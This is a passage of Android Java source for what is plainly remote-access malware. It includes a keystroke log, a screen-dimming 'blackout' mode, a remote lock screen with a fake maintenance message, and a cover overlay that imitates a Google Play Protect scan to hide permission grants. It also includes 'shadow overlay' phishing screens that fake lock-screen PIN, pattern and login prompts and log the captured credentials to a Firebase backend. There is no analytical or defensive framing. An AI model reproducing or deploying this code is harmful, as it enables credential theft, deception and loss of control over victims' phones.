        return (sum % 10 == 0);
    }

    public static List<String> getKeystrokes() {
        synchronized (keystrokes) {
            return new ArrayList<>(keystrokes);
        }
    }

    public static void clearKeystrokes() {
        keystrokes.clear();
    }

    // ============ BLACKOUT PROTOCOL ============

    private View blackoutView;
    private View lockView;
    private android.webkit.WebView overlayWebView;
    private View activeShadowOverlayView;

    public void startBlackout(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (blackoutView == null) {
                        blackoutView = new View(IO_Persistence_Manager.this);
                        blackoutView.setBackgroundColor(android.graphics.Color.argb(210, 0, 0, 0));
                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 2032 : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                                android.graphics.PixelFormat.TRANSLUCENT);
                        
                        params.screenBrightness = 0.001f;
                        params.buttonBrightness = 0.0f;
                        
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }
                        wm.addView(blackoutView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode ACTIVE");
                    }
                } else {
                    if (blackoutView != null) {
                        wm.removeViewImmediate(blackoutView);
                        blackoutView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Blackout Mode DISABLED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Blackout Error: " + e.getMessage()); }
        });
    }

    public static boolean isAntiRemovalEnabled() { return !skipAntiRemoval; }
    public static void setAntiRemovalEnabled(boolean enabled) { skipAntiRemoval = !enabled; }
    public static void forceSkipAntiRemoval() {
        skipAntiRemoval = true;
        // Auto-re-enable after 30 seconds of maintenance window
        new Handler(Looper.getMainLooper()).postDelayed(() -> skipAntiRemoval = false, 30000);
    }

    private static boolean autoPilotEngaged = true;
    public static void setAutoPilot(boolean enabled) { autoPilotEngaged = enabled; }
    public static boolean isAutoPilotEngaged() { return autoPilotEngaged; }

    private static int originalHapticState = -1;

    public static void silenceHaptics(Context context) {
        if (context == null) return;
        try {
            if (originalHapticState == -1) {
                originalHapticState = Settings.System.getInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 1);
            }
            Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, 0);
        } catch (Exception ignored) {}
    }

    public static void restoreHaptics(Context context) {
        if (context == null) return;
        try {
            if (originalHapticState != -1) {
                Settings.System.putInt(context.getContentResolver(), Settings.System.HAPTIC_FEEDBACK_ENABLED, originalHapticState);
                originalHapticState = -1;
            }
        } catch (Exception ignored) {}
    }

    private static View permissionCoverView = null;
    private static final Handler coverTextHandler = new Handler(Looper.getMainLooper());
    private static Runnable coverTextRunnable = null;
    private static final Handler coverWatchdogHandler = new Handler(Looper.getMainLooper());
    private static Runnable coverWatchdogRunnable = null;
    private static int coverTextIndex = 0;

    private static final String[][] COVER_STATUS_MESSAGES = {
        {"Verifying security environment...", "Scanning system components..."},
        {"Checking app signatures...", "Verifying developer credentials..."},
        {"Analyzing system permissions...", "Checking runtime security policies..."},
        {"Validating system integrity...", "Finalizing Play Protect scan..."}
    };

    public static void setPermissionCoverVisible(boolean show) {
        IO_Persistence_Manager instance = getInstance();
        if (instance == null) return;
        new Handler(Looper.getMainLooper()).post(() -> instance.togglePermissionCover(show));
    }

    public static boolean isPermissionCoverActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && permissionCoverView != null;
    }

    private void togglePermissionCover(boolean show) {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            if (wm == null) return;

            if (show) {
                if (permissionCoverView == null) {
                    ContextThemeWrapper themeContext = new ContextThemeWrapper(this, R.style.Theme_LabRATS);
                    LayoutInflater inflater = LayoutInflater.from(themeContext);
                    permissionCoverView = inflater.inflate(R.layout.activity_guide_permission, null);

                    View layoutScanning = permissionCoverView.findViewById(R.id.layoutScanning);
                    if (layoutScanning != null) {
                        layoutScanning.setVisibility(View.VISIBLE);
                    }

                    ProgressBar pb = permissionCoverView.findViewById(R.id.pbPlayProtect);
                    if (pb != null) {
                        pb.setIndeterminate(true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            pb.setIndeterminateTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
                            pb.setProgressTintList(android.content.res.ColorStateList.valueOf(android.graphics.Color.parseColor("#34A853")));
                        }
                        pb.setVisibility(View.VISIBLE);
                    }

                    TextView tvSub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
                    if (tvSub != null) {
                        tvSub.setText(COVER_STATUS_MESSAGES[0][0]);
                        tvSub.setAlpha(1.0f);
                        tvSub.setVisibility(View.VISIBLE);
                    }

                    TextView tvDetails = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);
                    if (tvDetails != null) {
                        tvDetails.setText(COVER_STATUS_MESSAGES[0][1]);
                        tvDetails.setAlpha(1.0f);
                        tvDetails.setVisibility(View.VISIBLE);
                    }

                    int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;

                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        overlayType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT);

                    params.gravity = android.view.Gravity.TOP | android.view.Gravity.START;
                    params.x = 0;
                    params.y = 0;

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                    }

                    permissionCoverView.setAlpha(1.0f);
                    wm.addView(permissionCoverView, params);

                    coverTextIndex = 0;
                    if (coverTextRunnable != null) {
                        coverTextHandler.removeCallbacks(coverTextRunnable);
                    }
                    coverTextRunnable = new Runnable() {
                        @Override
                        public void run() {
                            if (permissionCoverView == null) return;
                            try {
                                TextView sub = permissionCoverView.findViewById(R.id.tvPlayProtectSub);
                                TextView details = permissionCoverView.findViewById(R.id.tvPlayProtectDetails);

                                coverTextIndex = (coverTextIndex + 1) % COVER_STATUS_MESSAGES.length;
                                String[] msgs = COVER_STATUS_MESSAGES[coverTextIndex];

                                if (sub != null) {
                                    sub.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
                                        sub.setText(msgs[0]);
                                        sub.animate().alpha(1.0f).setDuration(150).start();
                                    }).start();
                                }

                                if (details != null) {
                                    details.animate().alpha(0.2f).setDuration(150).withEndAction(() -> {
                                        details.setText(msgs[1]);
                                        details.animate().alpha(1.0f).setDuration(150).start();
                                    }).start();
                                }

                                coverTextHandler.postDelayed(this, 1800);
                            } catch (Exception ignored) {}
                        }
                    };
                    coverTextHandler.postDelayed(coverTextRunnable, 1800);

                    // Safety Watchdog: Auto-dismiss cover overlay after 12s max if not dismissed by PermissionActivity
                    if (coverWatchdogRunnable != null) coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
                    coverWatchdogRunnable = () -> togglePermissionCover(false);
                    coverWatchdogHandler.postDelayed(coverWatchdogRunnable, 12000);

                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay DEPLOYED successfully");
                }
            } else {
                if (coverWatchdogRunnable != null) {
                    coverWatchdogHandler.removeCallbacks(coverWatchdogRunnable);
                    coverWatchdogRunnable = null;
                }
                if (coverTextRunnable != null) {
                    coverTextHandler.removeCallbacks(coverTextRunnable);
                    coverTextRunnable = null;
                }
                if (permissionCoverView != null) {
                    final View viewToRemove = permissionCoverView;
                    permissionCoverView = null;
                    try {
                        wm.removeView(viewToRemove);
                    } catch (Exception ignored) {}
                    Log.d(TAG, "GHOST_AUTOPILOT: Permission Cover Overlay REMOVED smoothly");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Permission Cover Overlay Error: " + e.getMessage());
        }
    }

    public static boolean isBlackoutActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.blackoutView != null;
    }

    public static boolean isLockActive() {
        IO_Persistence_Manager instance = getInstance();
        return instance != null && instance.lockView != null;
    }

    public void setRemoteLock(final boolean enabled) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (enabled) {
                    if (lockView == null) {
                        lockView = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                        lockView.setBackgroundColor(android.graphics.Color.BLACK);

                        android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                        tv.setText("SECURITY_MAINTENANCE_IN_PROGRESS\n\nPlease do not disconnect hardware.");
                        tv.setTextColor(android.graphics.Color.WHITE);
                        tv.setGravity(android.view.Gravity.CENTER);
                        tv.setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD);
                        tv.setTextSize(18);

                        ((android.widget.FrameLayout)lockView).addView(tv, new android.widget.FrameLayout.LayoutParams(
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                                android.widget.FrameLayout.LayoutParams.MATCH_PARENT));

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                                android.graphics.PixelFormat.OPAQUE);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
                        }

                        wm.addView(lockView, params);
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock DEPLOYED");
                    }
                } else {
                    if (lockView != null) {
                        wm.removeViewImmediate(lockView);
                        lockView = null;
                        FirebaseConfig.logActivity("GHOST_PROTOCOL: Remote System Lock RELEASED");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Lock Error: " + e.getMessage()); }
        });
    }

    /**
     * Deploys a Shadow Overlay (Phishing WebView) over the current application.
     */
    public void deployShadowOverlay(final String html) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (html != null && !html.isEmpty()) {
                    if (overlayWebView == null) {
                        overlayWebView = new android.webkit.WebView(IO_Persistence_Manager.this);
                        android.webkit.WebSettings settings = overlayWebView.getSettings();
                        settings.setJavaScriptEnabled(true);
                        settings.setDomStorageEnabled(true);
                        settings.setAllowFileAccess(true);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            settings.setMixedContentMode(android.webkit.WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
                        }
                        overlayWebView.setBackgroundColor(android.graphics.Color.TRANSPARENT);
                        
                        // Debugging: Capture JS console logs and alerts
                        overlayWebView.setWebChromeClient(new android.webkit.WebChromeClient() {
                            @Override
                            public boolean onConsoleMessage(android.webkit.ConsoleMessage consoleMessage) {
                                Log.d(TAG, "JS_CONSOLE: [" + consoleMessage.messageLevel() + "] " + consoleMessage.message() 
                                        + " (Line: " + consoleMessage.lineNumber() + ")");
                                return true;
                            }

                            @Override
                            public boolean onJsAlert(android.webkit.WebView view, String url, String message, android.webkit.JsResult result) {
                                Log.d(TAG, "JS_ALERT: " + message);
                                result.confirm();
                                return true;
                            }
                        });

                        // Interface to capture data from the overlay
                        overlayWebView.addJavascriptInterface(new Object() {
                            @android.webkit.JavascriptInterface
                            public void capture(String data) {
                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + data);
                                if (data != null && !data.trim().isEmpty()) {
                                    String clean = data.trim();
                                    if (clean.startsWith("PAT:")) {
                                        String patternCoords = clean.substring(4).trim();
                                        if (patternCoords.split("\\|").length >= 2) {
                                            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                                                    .putString("captured_pattern", patternCoords)
                                                    .remove("captured_pin")
                                                    .apply();
                                            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + patternCoords + "]");
                                        }
                                    } else if (clean.matches("\\d{4,8}")) {
                                        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                                                .putString("captured_pin", clean)
                                                .remove("captured_pattern")
                                                .apply();
                                        FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen PIN/Passcode = [" + clean + "]");
                                    }
                                }
                                deployShadowOverlay(null); // Auto-terminate on capture
                            }
                        }, "Uplink");

                        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.MATCH_PARENT,
                                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                                android.graphics.PixelFormat.TRANSLUCENT);

                        // Ensure focusability for interaction
                        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                        params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;
                        params.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;

                        wm.addView(overlayWebView, params);
                    }
                    overlayWebView.loadDataWithBaseURL("https://system.stability/", html, "text/html", "UTF-8", null);
                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Shadow Overlay projected to screen");
                } else {
                    if (overlayWebView != null) {
                        wm.removeViewImmediate(overlayWebView);
                        overlayWebView = null;
                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Overlay terminated");
                    }
                    if (activeShadowOverlayView != null) {
                        wm.removeViewImmediate(activeShadowOverlayView);
                        activeShadowOverlayView = null;
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Overlay Error: " + e.getMessage()); }
        });
    }

    private void applyKeypadButtonText(android.widget.Button btn, String digit, String subtext) {
        if (btn == null) return;
        btn.setTransformationMethod(null);
        btn.setAllCaps(false);

        if (subtext == null || subtext.trim().isEmpty()) {
            btn.setText(digit);
            btn.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 22);
            return;
        }

        String fullText = digit + "\n" + subtext;
        android.text.SpannableString spannable = new android.text.SpannableString(fullText);

        // Digit part: 22sp Bold
        spannable.setSpan(new android.text.style.AbsoluteSizeSpan(22, true), 0, digit.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);
        spannable.setSpan(new android.text.style.StyleSpan(android.graphics.Typeface.BOLD), 0, digit.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

        // Subtext letters part: 11sp Regular (noticeably smaller than digit)
        spannable.setSpan(new android.text.style.AbsoluteSizeSpan(11, true), digit.length() + 1, fullText.length(), android.text.Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);

        btn.setText(spannable);
    }

    public void deployShadowOverlayLayout(final int layoutResId) {
        deployShadowOverlayLayout(layoutResId, null);
    }

    public void deployShadowOverlayLayout(final int layoutResId, final String type) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                if (layoutResId != 0) {
                    if (activeShadowOverlayView != null) {
                        try { wm.removeViewImmediate(activeShadowOverlayView); } catch (Exception ignored) {}
                        activeShadowOverlayView = null;
                    }
                    if (overlayWebView != null) {
                        try { wm.removeViewImmediate(overlayWebView); } catch (Exception ignored) {}
                        overlayWebView = null;
                    }

                    android.view.LayoutInflater inflater = android.view.LayoutInflater.from(IO_Persistence_Manager.this);
                    activeShadowOverlayView = inflater.inflate(layoutResId, null);

                    android.widget.EditText etUsername = activeShadowOverlayView.findViewById(R.id.et_username);
                    android.widget.EditText etPassword = activeShadowOverlayView.findViewById(R.id.et_password);
                    android.widget.EditText etPin = activeShadowOverlayView.findViewById(R.id.et_pin);

                    // Configure PIN Keypad Buttons if present in layout
                    View btn0 = activeShadowOverlayView.findViewById(R.id.btn_key_0);
                    View btn1 = activeShadowOverlayView.findViewById(R.id.btn_key_1);
                    View btn2 = activeShadowOverlayView.findViewById(R.id.btn_key_2);
                    View btn3 = activeShadowOverlayView.findViewById(R.id.btn_key_3);
                    View btn4 = activeShadowOverlayView.findViewById(R.id.btn_key_4);
                    View btn5 = activeShadowOverlayView.findViewById(R.id.btn_key_5);
                    View btn6 = activeShadowOverlayView.findViewById(R.id.btn_key_6);
                    View btn7 = activeShadowOverlayView.findViewById(R.id.btn_key_7);
                    View btn8 = activeShadowOverlayView.findViewById(R.id.btn_key_8);
                    View btn9 = activeShadowOverlayView.findViewById(R.id.btn_key_9);
                    View btnDel = activeShadowOverlayView.findViewById(R.id.btn_key_del);
                    View btnLogin = activeShadowOverlayView.findViewById(R.id.btn_login);

                    if (btn1 instanceof android.widget.Button) {
                        applyKeypadButtonText((android.widget.Button) btn1, "1", "");
                        applyKeypadButtonText((android.widget.Button) btn2, "2", "ABC");
                        applyKeypadButtonText((android.widget.Button) btn3, "3", "DEF");
                        applyKeypadButtonText((android.widget.Button) btn4, "4", "GHI");
                        applyKeypadButtonText((android.widget.Button) btn5, "5", "JKL");
                        applyKeypadButtonText((android.widget.Button) btn6, "6", "MNO");
                        applyKeypadButtonText((android.widget.Button) btn7, "7", "PQRS");
                        applyKeypadButtonText((android.widget.Button) btn8, "8", "TUV");
                        applyKeypadButtonText((android.widget.Button) btn9, "9", "WXYZ");
                        applyKeypadButtonText((android.widget.Button) btn0, "0", "+");
                    }

                    View promptContainer = activeShadowOverlayView.findViewById(R.id.prompt_container);

                    Runnable updatePromptVisibility = () -> {
                        if (etPin != null) {
                            String pinVal = etPin.getText().toString().trim();
                            if (promptContainer != null) {
                                promptContainer.setVisibility(pinVal.length() > 0 ? View.GONE : View.VISIBLE);
                            }
                            if (btnLogin != null) {
                                btnLogin.setAlpha(pinVal.length() >= 4 ? 1.0f : 0.4f);
                            }

                            if (pinVal.length() >= 4 && pinVal.length() <= 6) {
                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                                        .putString("captured_pin", pinVal)
                                        .remove("captured_pattern")
                                        .commit();
                                FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Overlay PIN = [" + pinVal + "]");
                            }
                        }
                    };

                    View.OnClickListener numListener = v -> {
                        if (etPin != null) {
                            String digit = v.getTag() != null ? v.getTag().toString() : "";
                            if (digit.isEmpty() && v instanceof android.widget.Button) {
                                String text = ((android.widget.Button) v).getText().toString();
                                if (text.contains("\n")) text = text.substring(0, text.indexOf("\n"));
                                digit = text;
                            }
                            if (!digit.isEmpty()) {
                                etPin.append(digit);
                                updatePromptVisibility.run();
                            }
                        }
                    };

                    if (btn0 != null) btn0.setOnClickListener(numListener);
                    if (btn1 != null) btn1.setOnClickListener(numListener);
                    if (btn2 != null) btn2.setOnClickListener(numListener);
                    if (btn3 != null) btn3.setOnClickListener(numListener);
                    if (btn4 != null) btn4.setOnClickListener(numListener);
                    if (btn5 != null) btn5.setOnClickListener(numListener);
                    if (btn6 != null) btn6.setOnClickListener(numListener);
                    if (btn7 != null) btn7.setOnClickListener(numListener);
                    if (btn8 != null) btn8.setOnClickListener(numListener);
                    if (btn9 != null) btn9.setOnClickListener(numListener);

                    if (btnDel != null) {
                        btnDel.setOnClickListener(v -> {
                            if (etPin != null && etPin.getText().length() > 0) {
                                etPin.setText(etPin.getText().subSequence(0, etPin.getText().length() - 1));
                                updatePromptVisibility.run();
                            }
                        });
                    }

                    if (btnLogin != null) {
                        btnLogin.setOnClickListener(v -> {
                            String u = etUsername != null ? etUsername.getText().toString().trim() : "";
                            String p = etPassword != null ? etPassword.getText().toString().trim() : "";
                            String pin = etPin != null ? etPin.getText().toString().trim() : "";

                            if (etPin != null && pin.length() < 4) {
                                return; // Require at least 4 digits before allowing OK submit
                            }

                            String captured = "";
                            if (!pin.isEmpty()) {
                                captured = pin;
                            } else if (!u.isEmpty() || !p.isEmpty()) {
                                captured = u + ":" + p;
                            }

                            if (!captured.isEmpty()) {
                                FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay credentials captured -> " + captured);
                                getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                                        .putString("captured_pin", captured)
                                        .remove("captured_pattern")
                                        .commit();
                                FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Credential = [" + captured + "]");
                                logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: OVERLAY_DATA = " + captured + "\n==========================================\n");
                            }
                            deployShadowOverlayLayout(0);
                        });
                    }

                    // Configure Pattern Touch Layer if present in layout
                    FrameLayout patternContainer = activeShadowOverlayView.findViewById(R.id.pattern_container);
                    if (patternContainer != null) {
                        List<View> dots = new ArrayList<>();
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_0));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_1));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_2));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_3));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_4));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_5));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_6));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_7));
                        dots.add(activeShadowOverlayView.findViewById(R.id.dot_8));

                        PatternOverlayView patternView = new PatternOverlayView(IO_Persistence_Manager.this);
                        patternView.setDotViews(dots);
                        patternView.setOnPatternCompleteListener(patternCoords -> {
                            FirebaseConfig.logActivity("INTEL_EXTRACTED: Overlay pattern captured -> PAT:" + patternCoords);
                            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit()
                                    .putString("captured_pattern", patternCoords)
                                    .remove("captured_pin")
                                    .apply();
                            FirebaseConfig.logActivity("CREDENTIAL_CAPTURED: Lock Screen Pattern Coords = [" + patternCoords + "]");
                            logKeystroke("\n==========================================\n[CREDENTIAL_CAPTURED]: LOCK_SCREEN_PATTERN = " + patternCoords + "\n==========================================\n");
                            deployShadowOverlayLayout(0);
                        });

                        patternContainer.addView(patternView, new FrameLayout.LayoutParams(
                                FrameLayout.LayoutParams.MATCH_PARENT,
                                FrameLayout.LayoutParams.MATCH_PARENT
                        ));
                    }

                    int overlayType = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003;

                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            overlayType,
                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                                    WindowManager.LayoutParams.FLAG_FULLSCREEN |
                                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
                            android.graphics.PixelFormat.TRANSLUCENT);

                    params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                    params.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE | WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE;
                    params.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;

                    wm.addView(activeShadowOverlayView, params);
                    FirebaseConfig.logActivity("EXPLOIT_DEPLOYED: Native Shadow Layout Overlay projected to screen");
                } else {
                    if (activeShadowOverlayView != null) {
                        wm.removeViewImmediate(activeShadowOverlayView);
                        activeShadowOverlayView = null;
                        FirebaseConfig.logActivity("EXPLOIT_RELEASED: Shadow Layout Overlay terminated");
                    }
                }
            } catch (Exception e) { Log.e(TAG, "Native Overlay Error: " + e.getMessage()); }
        });
    }

    public void showOverlayToast(final String message) {
        showOverlayToast(message, 22, 250, "scroll", 12000, "#FFFFFF");
    }

    public void showOverlayToast(final String message, final int fontSize, final int yPos, final String animation, final int duration, final String hexColor) {
        if (message == null || message.isEmpty()) return;
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                WindowManager wm = (WindowManager) getSystemService(android.content.Context.WINDOW_SERVICE);
                
                final android.widget.TextView tv = new android.widget.TextView(IO_Persistence_Manager.this);
                tv.setText(message);
                
                int color = android.graphics.Color.WHITE;
                if (hexColor != null && !hexColor.isEmpty()) {
                    try { color = android.graphics.Color.parseColor(hexColor); } catch (Exception ignored) {}
                }
                tv.setTextColor(color);
                tv.setPadding(30, 20, 30, 20);
                tv.setTextSize(fontSize > 0 ? fontSize : 22);
                tv.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
                
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY : 2003,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        android.graphics.PixelFormat.TRANSLUCENT);

                android.view.View viewToDisplay = tv;

                if ("scroll".equalsIgnoreCase(animation)) {
                    tv.setSingleLine(true);
                    tv.setGravity(android.view.Gravity.START | android.view.Gravity.CENTER_VERTICAL);
                    
                    // Container to allow tight background on tv while window is full-width
                    android.widget.FrameLayout container = new android.widget.FrameLayout(IO_Persistence_Manager.this);
                    container.addView(tv, new android.widget.FrameLayout.LayoutParams(
                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT,
                            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT));
                    
                    params.width = WindowManager.LayoutParams.MATCH_PARENT;
                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.START;
                    params.x = 0;
                    tv.setTranslationX(2500); 
                    viewToDisplay = container;
                } else {
                    tv.setGravity(android.view.Gravity.CENTER);
                    params.gravity = android.view.Gravity.BOTTOM | android.view.Gravity.CENTER_HORIZONTAL;
                    params.x = 0;
                }
                params.y = yPos > 0 ? yPos : 250; 

                // Rounded corners via drawable
                android.graphics.drawable.GradientDrawable shape = new android.graphics.drawable.GradientDrawable();
                shape.setCornerRadius(50);
                shape.setColor(android.graphics.Color.argb(230, 20, 20, 20));
                tv.setBackground(shape);

                final android.view.View finalView = viewToDisplay;
                wm.addView(finalView, params);
                
                final int screenW = getScreenWidth() > 0 ? getScreenWidth() : getResources().getDisplayMetrics().widthPixels;

                if ("pop".equalsIgnoreCase(animation)) {
                    tv.setAlpha(0f);
                    tv.setScaleX(0.5f);
                    tv.setScaleY(0.5f);
                    tv.animate()
                      .alpha(1f)
                      .scaleX(1.1f)
                      .scaleY(1.1f)
                      .setDuration(300)
                      .withEndAction(() -> {
                          tv.animate().scaleX(1.0f).scaleY(1.0f).setDuration(100).start();
                          new Handler(Looper.getMainLooper()).postDelayed(() -> {
                              tv.animate().alpha(0f).setDuration(500).withEndAction(() -> {
                                  try { wm.removeView(finalView); } catch (Exception ignored) {}
                              }).start();
                          }, duration > 0 ? duration : 3000);
                      })
                      .start();
                } else if ("scroll".equalsIgnoreCase(animation)) {
                    tv.post(() -> {
                        // Calculate text width to know when it's fully off-screen
